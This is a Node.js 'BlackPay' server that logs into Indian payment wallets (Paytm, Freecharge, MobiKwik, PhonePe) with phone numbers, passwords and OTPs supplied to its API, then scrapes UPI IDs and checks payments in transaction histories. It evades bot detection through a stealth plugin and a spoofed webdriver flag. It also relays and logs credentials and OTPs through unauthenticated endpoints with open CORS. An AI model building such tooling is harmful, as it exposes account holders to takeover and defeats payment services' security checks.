const express = require('express');
const cors = require('cors');
const fs = require('fs'); 
const path = require('path');

// ANTI-CAPTCHA STEALTH MODE ACTIVATED
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(cors());

app.get('/', (req, res) => {
    let jsonResponse = { success: true, message: "BlackPay Server is Live & Running!" };
    res.json(jsonResponse);
});

// Global variables
let browser;
let page;
let currentPhone = "";
let currentWallet = "";

console.log("🔥 BlackPay Server Active (Smart UTR, Last 4-Digit & Paytm UPI Master Scanner)...");

async function dismissPopups(page) {
    try {
        await page.evaluate(() => {
            const elements = document.querySelectorAll('button, div, span, a, i');
            elements.forEach(el => {
                const text = el.innerText ? el.innerText.toUpperCase() : '';
                if (text.includes('CLOSE') || text === 'X' || el.className.includes('close')) el.click();
            });
        });
    } catch (e) {
        // Ignore error
    }
}

// ============================================================================
// 1. API: AUTOMATED SEND OTP
// ============================================================================
app.post('/api/wallet/send-otp', async (req, res) => {
    const { phone, password, walletType } = req.body; 

    if (!phone || phone.length !== 10) {
        return res.status(400).json({ success: false, message: "Invalid 10 digit number!" });
    }

    if (browser) {
        try { await browser.close(); } catch(e) {}
    }

    try {
        let walletName = walletType ? walletType.toLowerCase() : "";
        currentPhone = phone;
        currentWallet = walletName;

        console.log(`\n[+] New Login Request -> Phone: ${phone} | Wallet: ${walletName.toUpperCase()}`);
        
        browser = await puppeteer.launch({ 
            headless: true, // 🔴 Cloud pe true hona zaroori hai
            defaultViewport: null,
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process'
            ]
        });
        
        page = await browser.newPage();
        
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        await page.evaluateOnNewDocument(() => { 
            Object.defineProperty(navigator, 'webdriver', { get: () => false }); 
        });

        await page.setRequestInterception(true);
        page.on('request', (req) => {
            if (['image', 'media'].includes(req.resourceType())) { req.abort(); } 
            else { req.continue(); }
        });

        // ================= PAYTM FLOW =================
        if (walletName === 'paytm' || walletName === 'paytm business') {
            console.log("[+] Opening Paytm Business login page...");
            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 60000 });
            
            let targetFrame = null;
            let inputField = null;

            for (let attempt = 0; attempt < 20; attempt++) {
                for (let frame of page.frames()) {
                    try {
                        let inputs = await frame.$$('input:not([type="password"]):not([type="hidden"])');
                        for (let el of inputs) {
                            let box = await el.boundingBox();
                            if (box && box.width > 0 && box.height > 0) {
                                inputField = el;
                                targetFrame = frame;
                                break;
                            }
                        }
                    } catch (e) {}
                    if (inputField) break;
                }
                if (inputField) break;
                await new Promise(r => setTimeout(r, 1000));
            }

            if (!inputField) {
                return res.status(400).json({ success: false, message: "Paytm page load failed." });
            }

            await inputField.focus();
            await inputField.click({ clickCount: 3 }); 
            await inputField.press('Backspace');       
            await inputField.type(phone, { delay: 100 }); 
            await new Promise(r => setTimeout(r, 1000));
            await page.keyboard.press('Enter');
            await new Promise(r => setTimeout(r, 3000));

            if (password) {
                let passField = null;
                for (let frame of page.frames()) {
                    try {
                        let fields = await frame.$$('input[type="password"]');
                        for (let el of fields) {
                            let box = await el.boundingBox();
                            if (box && box.width > 0 && box.height > 0) {
                                passField = el;
                                break;
                            }
                        }
                    } catch (e) {}
                    if (passField) break;
                }

                if (passField) {
                    await passField.focus();
                    await passField.click({ clickCount: 3 });
                    await passField.press('Backspace');
                    await passField.type(password, { delay: 100 });
                    await new Promise(r => setTimeout(r, 1000));
                }
            }

            await page.keyboard.press('Enter');
        }

        // ================= FREECHARGE FLOW =================
        else if (walletName.includes('freecharge')) {
            console.log("[+] Opening Freecharge homepage...");
            await page.goto('https://www.freecharge.in/', { waitUntil: 'networkidle2', timeout: 60000 });
            await new Promise(r => setTimeout(r, 3000)); 

            console.log("[+] Locating Login button coordinates...");
            const loginCoords = await page.evaluate(() => {
                const els = Array.from(document.querySelectorAll('*'));
                const loginBtn = els.find(e => e.innerText && e.innerText.trim() === 'Login' && e.getBoundingClientRect().width > 0);
                if (loginBtn) {
                    const rect = loginBtn.getBoundingClientRect();
                    return { x: rect.x + (rect.width / 2), y: rect.y + (rect.height / 2) };
                }
                return null;
            });

            if (loginCoords) {
                await page.mouse.click(loginCoords.x, loginCoords.y);
            } else {
                await page.mouse.click(1250, 40); 
            }

            await new Promise(r => setTimeout(r, 3000));

            const inputCoords = await page.evaluate(() => {
                const inputs = Array.from(document.querySelectorAll('input'));
                const target = inputs.find(inp => {
                    let p = (inp.getAttribute('placeholder') || '').toLowerCase();
                    let t = (inp.getAttribute('type') || '').toLowerCase();
                    return (p.includes('mobile') || t === 'tel' || t === 'text') && inp.getBoundingClientRect().width > 0;
                });
                if (target) {
                    const rect = target.getBoundingClientRect();
                    return { x: rect.x + (rect.width / 2), y: rect.y + (rect.height / 2) };
                }
                return null;
            });

            if (inputCoords) {
                await page.mouse.click(inputCoords.x, inputCoords.y, { clickCount: 3 });
                await page.keyboard.press('Backspace');
                await page.keyboard.type(phone, { delay: 100 }); 
            } else {
                return res.status(400).json({ success: false, message: "Freecharge popup input field coordinates not found." });
            }

            await new Promise(r => setTimeout(r, 1000));

            const otpCoords = await page.evaluate(() => {
                const els = Array.from(document.querySelectorAll('*'));
                const btn = els.find(e => e.innerText && e.innerText.toUpperCase().includes('GET OTP') && e.getBoundingClientRect().width > 0);
                if (btn) {
                    const rect = btn.getBoundingClientRect();
                    return { x: rect.x + (rect.width / 2), y: rect.y + (rect.height / 2) };
                }
                return null;
            });

            if (otpCoords) {
                await page.mouse.click(otpCoords.x, otpCoords.y);
            } else {
                await page.keyboard.press('Enter');
            }
            
            console.log("[+] OTP request triggered successfully.");
        }

        // ================= OTHER WALLETS FLOW =================
        else {
            if (walletName.includes('mobikwik')) {
                await page.goto('https://www.mobikwik.com/', { waitUntil: 'domcontentloaded', timeout: 60000 });
                await new Promise(r => setTimeout(r, 3000));
                try { await page.mouse.click(1250, 25); } catch(e){}
            } else if (walletName.includes('phonepe')) {
                await page.goto('https://business.phonepe.com/login', { waitUntil: 'domcontentloaded', timeout: 60000 });
            }
            await new Promise(r => setTimeout(r, 3000));
            try {
                await page.evaluate((num) => {
                    const inputs = document.querySelectorAll('input');
                    for (let inp of inputs) {
                        if (inp.offsetParent !== null) {
                            inp.focus(); 
                            inp.value = num;
                            inp.dispatchEvent(new Event('input', { bubbles: true }));
                            return true;
                        }
                    }
                }, phone);
            } catch(e){}
            await new Promise(r => setTimeout(r, 1000));
            
            const otpCoords = await page.evaluate(() => {
                const els = Array.from(document.querySelectorAll('button, span, div, a'));
                const btn = els.find(e => e.innerText && (e.innerText.toUpperCase().includes('OTP') || e.innerText.toUpperCase().includes('LOGIN') || e.innerText.toUpperCase().includes('CONTINUE')) && e.getBoundingClientRect().width > 0);
                if (btn) {
                    const rect = btn.getBoundingClientRect();
                    return { x: rect.x + (rect.width / 2), y: rect.y + (rect.height / 2) };
                }
                return null;
            });

            if (otpCoords) {
                await page.mouse.click(otpCoords.x, otpCoords.y);
            } else {
                await page.keyboard.press('Enter');
            }
        }
        
        res.json({ success: true, message: `OTP request sent for ${phone}` });

    } catch (error) {
        console.error(`❌ Error in send-otp:`, error);
        res.status(500).json({ success: false, message: "Network Error.", error: error.message });
    }
});

// ============================================================================
// 2. API: VERIFY OTP & EXTRACT UPI
// ============================================================================
app.post('/api/wallet/verify-otp', async (req, res) => {
    const { otp } = req.body;
    if (!page) return res.status(400).json({ success: false, message: "Browser session not active." });

    try {
        console.log(`[+] Injecting OTP: ${otp}`);
        
        let frames = [page, ...page.frames()];
        let otpTyped = false;
        let interceptedUpi = "";
        let isOtpApiFailed = false;

        const networkListener = async (response) => {
            try {
                const req = response.request();
                if (req.method() === 'OPTIONS') return;

                const url = response.url().toLowerCase();
                const type = req.resourceType();

                if (type === 'xhr' || type === 'fetch') {
                    const text = await response.text();
                    
                    // 🔴 PAYTM UPI INTERCEPTOR (With @pty Support)
                    const upiRegex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|freecharge|icici|ybl|axl|oksbi|apypaytm|mobikwik|ikwik|upi|ptsbi)/i;
                    const match = text.match(upiRegex);
                    if (match && !interceptedUpi) {
                        interceptedUpi = match[0];
                        console.log(`[+] API Sniffed UPI ID: ${interceptedUpi}`);
                    }

                    if (url.includes('verify') || url.includes('login') || url.includes('auth') || url.includes('otp')) {
                        if (response.status() >= 400) {
                            isOtpApiFailed = true;
                        } else {
                            const textLower = text.toLowerCase();
                            if (textLower.includes('"success":false') || 
                                textLower.includes('invalid otp') || 
                                textLower.includes('incorrect otp') || 
                                textLower.includes('wrong otp') ||
                                textLower.includes('invalid verification')) {
                                isOtpApiFailed = true;
                            }
                        }
                    }
                }
            } catch(e) {} 
        };

        page.on('response', networkListener);

        try {
            for (let frame of frames) {
                try {
                    let inputs = await frame.$$('input:not([type="hidden"])');
                    for (let el of inputs) {
                        let box = await el.boundingBox();
                        if (box && box.width > 0 && box.height > 0) {
                            await el.focus();
                            await el.click({ clickCount: 3 });
                            await el.press('Backspace');
                            await el.type(otp, { delay: 60 });
                            otpTyped = true;
                            break;
                        }
                    }
                } catch (e) {}
                if (otpTyped) break;
            }
        } catch(e) { }

        if (!otpTyped) {
            await page.keyboard.type(otp, { delay: 60 });
        }

        await new Promise(r => setTimeout(r, 500));
        await page.keyboard.press('Enter');

        console.log("[+] Awaiting API verification (4 seconds)...");
        await new Promise(r => setTimeout(r, 4000)); 
        await dismissPopups(page);
        
        page.off('response', networkListener);

        if (isOtpApiFailed) {
            console.log("❌ WRONG OTP DETECTED via Network Interception.");
            return res.status(400).json({ success: false, message: "Invalid OTP! Please try again." });
        }

        const currentUrl = page.url() || "";
        const isFreecharge = currentUrl.includes('freecharge') || currentWallet.includes('freecharge');
        const isMobikwik = currentUrl.includes('mobikwik') || currentWallet.includes('mobikwik');
        const isPhonepe = currentUrl.includes('phonepe') || currentWallet.includes('phonepe');

        let finalUpi = "";

        if (isFreecharge) {
            finalUpi = `${currentPhone}@freecharge`;
        } else if (isMobikwik) {
            finalUpi = `${currentPhone}@ikwik`; 
        } else if (isPhonepe) {
            finalUpi = `${currentPhone}@ybl`; 
        } else {
            try {
                if (currentUrl.includes('paytm')) {
                    await page.goto('https://dashboard.paytm.com/next/qr-details', { waitUntil: 'domcontentloaded', timeout: 30000 });
                }
            } catch(navErr) {}

            console.log("[+] Searching for UPI ID...");

            for (let i = 0; i < 15; i++) {
                if (interceptedUpi) {
                    finalUpi = interceptedUpi;
                    break;
                }

                // 🔴 SAFE HTML DOM EXTRACTOR WITH @pty FIX
                finalUpi = await page.evaluate(() => {
                    try {
                        if (!document || !document.documentElement) return "";
                        
                        const htmlContent = document.documentElement.innerHTML || document.body.innerHTML || "";
                        const regex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|upi)/i;
                        const match = htmlContent.match(regex);
                        
                        if (match) return match[0];
                        return "";
                    } catch (e) {
                        return ""; 
                    }
                });

                if (finalUpi) break;
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        if (typeof finalUpi === 'undefined' || !finalUpi) {
            return res.status(400).json({ success: false, message: "Login successful but UPI ID extraction failed." });
        }

        console.log(`[+] Authentication complete. Extracted UPI: ${finalUpi}`);
        res.json({ 
            success: true, 
            message: "Account Successfully Linked!", 
            upi_id: finalUpi,
            mobile: currentPhone 
        });

    } catch (error) {
        console.error("❌ Catch error in verify-otp:", error.message);
        res.status(500).json({ success: false, message: "Validation Process Failed." });
    }
});

// ============================================================================
// 3. API: SMART VERIFY UTR (UTR, AMOUNT OR LAST 4 DIGITS)
// ============================================================================
app.post('/api/wallet/verify-utr', async (req, res) => {
    const { utr, amount, last4 } = req.body;
    
    if (!page) return res.status(400).json({ success: false, message: "Browser session not active." });
    if (!utr) return res.status(400).json({ success: false, message: "UTR missing." });

    try {
        console.log(`[+] Smart Verifying Order -> UTR: ${utr} | Amt: ${amount} | Acc Last4: ${last4}`);
        const currentUrl = page.url() || "";
        
        if (currentUrl.includes('freecharge') || currentWallet.includes('freecharge')) {
            await page.goto('https://www.freecharge.in/desktop/app/transactions', { waitUntil: 'domcontentloaded', timeout: 45000 });
        } else if (currentUrl.includes('mobikwik') || currentWallet.includes('mobikwik')) {
            await page.goto('https://www.mobikwik.com/history', { waitUntil: 'domcontentloaded', timeout: 45000 });
        } else if (currentUrl.includes('phonepe') || currentWallet.includes('phonepe')) {
            await page.goto('https://business.phonepe.com/transactions', { waitUntil: 'domcontentloaded', timeout: 45000 });
        } else {
            await page.goto('https://dashboard.paytm.com/next/passbook', { waitUntil: 'domcontentloaded', timeout: 45000 });
        }

        await new Promise(r => setTimeout(r, 4000));
        await dismissPopups(page);

        // Advanced Search: Matches UTR, OR matches BOTH Amount & Last 4 Digits
        const isFound = await page.evaluate((searchUtr, searchAmt, searchLast4) => {
            const bodyText = document.body.innerText.replace(/\s+/g, '');
            
            // 1. Try exact UTR match
            let found = bodyText.includes(searchUtr);
            
            // 2. Try Amount + Last 4 digits match if UTR fails
            if (!found && searchAmt && searchLast4) {
                 if (bodyText.includes(searchAmt) && bodyText.includes(searchLast4)) {
                     found = true;
                 }
            }
            return found;
        }, utr.trim(), amount ? amount.toString() : "", last4 ? last4.toString() : "");

        if (isFound) {
            console.log(`[✔] Match Found! Auto-Approving Order.`);
            res.json({ success: true, message: "Payment Verified Successfully!", utr: utr });
        } else {
            // 🔴 If not found, DO NOT send error. Send success: false so App handles it silently (Pending).
            console.log(`[!] Not Found automatically. Pushing to Pending/Manual.`);
            res.json({ success: false, message: "Awaiting Manual Confirmation.", utr: utr });
        }

    } catch (error) {
        console.error("❌ Error verifying UTR:", error);
        res.json({ success: false, message: "Server busy, sent for manual review.", utr: utr });
    }
});

// ================= ERROR HANDLERS =================
app.use((req, res, next) => {
    res.status(404).json({ success: false, message: "Invalid API Endpoint." });
});

app.use((err, req, res, next) => {
    res.status(500).json({ success: false, message: "Internal Server Error.", error: err.message });
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 BlackPay Server running on port ${PORT}`);
});
